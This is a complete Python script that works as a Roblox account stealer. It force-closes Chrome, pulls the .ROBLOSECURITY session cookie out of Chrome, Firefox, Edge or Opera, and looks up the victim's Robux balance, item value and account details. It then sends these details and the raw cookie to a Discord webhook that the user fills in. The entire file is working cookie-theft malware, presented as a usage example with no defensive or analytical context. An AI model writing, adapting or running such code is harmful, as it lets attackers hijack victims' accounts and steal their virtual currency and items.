import psutil
import subprocess
import browser_cookie3
import requests
import robloxpy
import json
import time

def is_chrome_running():
    """Check if Chrome is running."""
    for process in psutil.process_iter(['name']):
        if 'chrome' in process.info['name'].lower():
            return True
    return False

def close_chrome():
    """Close Chrome if it is running."""
    while is_chrome_running():
        print("Chrome is running. Attempting to close it...")
        subprocess.call(["taskkill", "/F", "/IM", "chrome.exe"])  # Force close Chrome
        time.sleep(1)  # Wait a bit to allow the processes to close

def get_roblosecurity_cookie():
    close_chrome()  # Ensure Chrome is closed before grabbing cookies
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                print("Found in Chrome")
                return cookie.value, "Chrome"
    except Exception as e:
        print(f"Error with Chrome: {e}")

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                print("Found in Firefox")
                return cookie.value, "Firefox"
    except Exception as e:
        print(f"Error with Firefox: {e}")
    
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                print("Found in Edge")
                return cookie.value, "Edge"
    except Exception as e:
        print(f"Error with Edge: {e}")

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                print("Found in Opera")
                return cookie.value, "Opera"
    except Exception as e:
        print(f"Error with Opera: {e}")
    
    return None, None

def send_to_discord(webhook_url, cookie_value, browser_name):
    # Get Roblox account info
    info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie_value}).text)
    roblox_id = info["UserID"]
    username = info['UserName']
    robux = info['RobuxBalance']
    premium_status = info['IsPremium']
    
    # Using robloxpy to fetch additional information
    rap = robloxpy.User.External.GetRAP(roblox_id)
    friends = robloxpy.User.Friends.External.GetCount(roblox_id)
    age = robloxpy.User.External.GetAge(roblox_id)
    creation_date = robloxpy.User.External.CreationDate(roblox_id)
    rolimons = f"https://www.rolimons.com/player/{roblox_id}"
    roblox_profile = f"https://web.roblox.com/users/{roblox_id}/profile"
    headshot_raw = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={roblox_id}&size=420x420&format=Png&isCircular=false").text
    headshot_json = json.loads(headshot_raw)
    headshot = headshot_json["data"][0]["imageUrl"]

    # Preparing the embed data
    embed = {
        "title": f"Roblox Account Info: {username}",
        "url": roblox_profile,
        "color": 0x00ff00,
        "fields": [
            {"name": "Username", "value": username, "inline": True},
            {"name": "User ID", "value": str(roblox_id), "inline": True},
            {"name": "Robux Balance", "value": str(robux), "inline": True},
            {"name": "Premium Status", "value": str(premium_status), "inline": True},
            {"name": "RAP", "value": str(rap), "inline": True},
            {"name": "Friends Count", "value": str(friends), "inline": True},
            {"name": "Account Age", "value": str(age) + " days", "inline": True},
            {"name": "Creation Date", "value": creation_date, "inline": True},
            {"name": "Rolimons Profile", "value": rolimons, "inline": True}
        ],
        "thumbnail": {"url": headshot}
    }

    # Sending the embed message
    embed_data = {"embeds": [embed]}
    response = requests.post(webhook_url, json=embed_data)
    if response.status_code == 204:
        print("Embed sent to Discord successfully!")
    else:
        print(f"Failed to send embed. Status code: {response.status_code}, Response: {response.text}")

    # Sending the cookie in a separate message
    cookie_data = {"content": f"**.ROBLOSECURITY Cookie:** ||{cookie_value}||"}
    response = requests.post(webhook_url, json=cookie_data)
    if response.status_code == 204:
        print("Cookie sent to Discord successfully!")
    else:
        print(f"Failed to send cookie. Status code: {response.status_code}, Response: {response.text}")

# Usage example:
webhook_url = "WEBHOOK HERE"

roblosecurity_cookie, browser_name = get_roblosecurity_cookie()
if roblosecurity_cookie:
    print(f"ROBLOSECURITY cookie found in {browser_name}!")
    send_to_discord(webhook_url, roblosecurity_cookie, browser_name)
else:
    print("ROBLOSECURITY cookie not found.")
